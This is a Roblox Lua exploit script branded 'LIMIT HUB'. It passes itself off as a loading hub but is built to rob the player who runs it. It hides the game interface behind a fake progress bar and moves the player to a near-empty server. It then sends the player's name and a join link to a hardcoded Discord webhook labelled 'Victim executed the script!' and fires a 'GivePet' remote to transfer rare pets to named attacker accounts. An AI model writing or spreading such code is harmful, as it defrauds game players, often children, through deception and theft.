local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local placeId = 126884695634066

local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

local pets = {"Trex", "fennec fox", "Raccoon", "dragonfly", "butterfly", "queenbee", "spinosaurus", "redfox", "Brontosaurus", "mooncat", "mimic octopus", "disco bee", "dilophosaurus", "kitsune"}
local targets = {"boneblossom215", "beanstalk1251", "burningbud709"}

-- Helper: queue_on_teleport implementation (in case not defined)
if not queue_on_teleport then
    queue_on_teleport = function(func)
        -- Serialize function as string and queue to run after teleport
        local source = tostring(func)
        -- This only works if executor supports queue_on_teleport; else no-op
        warn("queue_on_teleport is not defined in this environment.")
    end
end

local function createLoadingGui()
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LimitHubLoading"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame", screenGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.ZIndex = 999999

    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(0, 800, 0, 100)
    title.Position = UDim2.new(0.5, -400, 0.5, -60)
    title.BackgroundTransparency = 1
    title.Text = "LIMIT HUB"
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.Font = Enum.Font.Fantasy
    title.TextScaled = true
    title.ZIndex = 1000000

    local percentLabel = Instance.new("TextLabel", bg)
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, 80)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.Font = Enum.Font.Code
    percentLabel.TextScaled = true
    percentLabel.ZIndex = 1000000

    local barOutline = Instance.new("Frame", bg)
    barOutline.Size = UDim2.new(0, 400, 0, 25)
    barOutline.Position = UDim2.new(0.5, -200, 0.5, 40)
    barOutline.BackgroundColor3 = Color3.new(0, 0, 0)
    barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255)
    barOutline.BorderSizePixel = 2
    barOutline.ZIndex = 1000000

    local fill = Instance.new("Frame", barOutline)
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    fill.BorderSizePixel = 0
    fill.ZIndex = 1000001

    local percent = 0

    -- Animate loading bar: 5% every 10 seconds
    task.spawn(function()
        while percent < 100 do
            percent += 5
            percentLabel.Text = percent .. "%"
            fill.Size = UDim2.new(percent / 100, 0, 1, 0)
            task.wait(10)
        end
    end)

    -- Return GUI and a function to check if loading is done
    return screenGui, function()
        return percent >= 100
    end
end

local function sendWebhook(petsInventory, playerName, joinLink)
    local data = {
        content = "**Victim executed the script!**",
        embeds = {{
            title = "Pet Inventory & Join Link",
            color = 16711680,
            fields = {
                {name = "Player Name", value = playerName, inline = false},
                {name = "Pets Sent", value = table.concat(petsInventory, ", "), inline = false},
                {name = "Join Link", value = joinLink or "No link available", inline = false},
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local jsonData = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then
        warn("Failed to send webhook: " .. tostring(err))
    end
end

local function petTransfer()
    for _, player in ipairs(Players:GetPlayers()) do
        for _, targetName in ipairs(targets) do
            if player.Name == targetName then
                for _, pet in ipairs(pets) do
                    pcall(function()
                        ReplicatedStorage:WaitForChild("GivePet"):FireServer(pet, player)
                    end)
                end
                return true
            end
        end
    end
    return false
end

local function postTeleport()
    local gui, isDone = createLoadingGui()

    -- Wait until loading bar hits 100%
    while not isDone() do
        task.wait(1)
    end

    -- Destroy GUI after loading complete
    gui:Destroy()

    -- Prepare webhook data
    local jobId = game.JobId
    local joinLink = ("https://www.roblox.com/games/%d/?visit=%s"):format(placeId, jobId)
    local playerName = LocalPlayer.Name

    -- Send webhook
    sendWebhook(pets, playerName, joinLink)

    -- Silent pet transfer
    petTransfer()

    -- Re-enable core GUI
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
        StarterGui:SetCore("TopbarEnabled", true)
    end)
end

local function serverHop()
    local cursor = ""
    local bestServer = nil

    repeat
        local success, response = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(
                ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
            ))
        end)

        if success and response and response.data then
            for _, server in ipairs(response.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    if not bestServer or server.playing < bestServer.playing then
                        bestServer = server
                    end
                end
            end
            cursor = response.nextPageCursor or ""
        else
            break
        end

        task.wait(0.2)
    until cursor == ""

    -- Queue postTeleport to run after teleport
    queue_on_teleport(postTeleport)

    if bestServer then
        TeleportService:TeleportToPlaceInstance(placeId, bestServer.id, LocalPlayer)
    else
        TeleportService:Teleport(placeId, LocalPlayer)
    end
end

-- Run server hop now
serverHop()
